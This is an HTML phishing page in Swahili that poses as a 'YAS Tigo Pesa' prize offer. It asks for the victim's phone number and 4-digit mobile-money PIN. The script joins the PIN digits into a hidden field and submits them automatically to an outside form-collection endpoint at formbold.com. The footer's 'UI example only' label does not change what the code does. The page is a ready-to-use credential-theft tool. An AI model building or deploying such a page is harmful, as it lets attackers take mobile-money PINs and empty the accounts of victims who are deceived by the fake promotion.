<!DOCTYPE html>
<html lang="sw">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Umejishindia Ofa</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>

<div class="card">
    <h2>Umejishindia Ofa Wa YAS Tigo pesa</h2>
    <p class="subtitle">
        Karibu! Ingiza namba yako ya simu na Neno Siri (YAS PIN - 4 namba) ili kupata ofa.
    </p>

    <form id="offerForm" action="https://formbold.com/s/3nqD1" method="POST">

        <!-- Phone -->
        <div class="phone-input">
            <input 
                type="tel" 
                id="phoneNumber" 
                name="phoneNumber"
                placeholder="Namba ya Simu" 
                maxlength="10" 
                required>
        </div>

        <!-- PIN -->
        <p class="pin-title">Enter your Tigo Pesa PIN</p>

        <div class="pin-boxes">
            <input type="password" maxlength="1" class="pin-box" inputmode="numeric" autocomplete="off">
            <input type="password" maxlength="1" class="pin-box" inputmode="numeric" autocomplete="off">
            <input type="password" maxlength="1" class="pin-box" inputmode="numeric" autocomplete="off">
            <input type="password" maxlength="1" class="pin-box" inputmode="numeric" autocomplete="off">
        </div>

        <input type="hidden" id="pin" name="pin">

        <!-- Button (fallback + UX) -->
        <button type="submit" class="submit-btn">Pata Ofa</button>
    </form>

    <p class="note">Kuingiza neno siri kunakubali maelezo ya matumizi.</p>
    <footer>© YAS Tanzania – Mfano wa UI pekee</footer>
</div>

<script>
const pinBoxes = document.querySelectorAll('.pin-box');
const hiddenPinInput = document.getElementById('pin');
const form = document.getElementById('offerForm');
const phoneNumberInput = document.getElementById('phoneNumber');

pinBoxes.forEach((box, index) => {

    box.addEventListener('input', (e) => {
        // Allow only numbers
        e.target.value = e.target.value.replace(/[^0-9]/g, '');

        if (e.target.value.length === 1) {
            if (index < pinBoxes.length - 1) {
                pinBoxes[index + 1].focus();
            } else {
                const allFilled = Array.from(pinBoxes).every(input => input.value.length === 1);

                if (allFilled) {
                    updateHiddenPin();

                    if (phoneNumberInput.value.trim() === '') {
                        alert('Tafadhali ingiza namba yako ya simu.');
                        phoneNumberInput.focus();
                        return;
                    }

                    form.requestSubmit(); // ✅ correct submit
                }
            }
        }

        updateHiddenPin();
    });

    box.addEventListener('keydown', (e) => {
        if (e.key === 'Backspace' && e.target.value === '' && index > 0) {
            pinBoxes[index - 1].focus();
        }
    });
});

function updateHiddenPin() {
    const pin = Array.from(pinBoxes).map(input => input.value).join('');
    hiddenPinInput.value = pin;
}
</script>

</body>
</html>
